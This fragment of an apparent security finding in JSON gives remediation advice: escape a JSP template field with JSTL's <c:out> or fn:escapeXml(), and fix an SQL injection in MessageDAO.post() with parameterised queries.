            "remediation": "Wrap the EL expression with JSTL's `<c:out>` or `fn:escapeXml()`:\n\n```jsp\n<h4><c:out value=\"${msg.subject}\"/></h4>\n```\n\nApply the same escaping to every other user-supplied field rendered in the template. Also fix the SQL injection vulnerability in `MessageDAO.post()` by using a parameterised `PreparedStatement` or `jdbcTemplate.update()` with `?` placeholders."
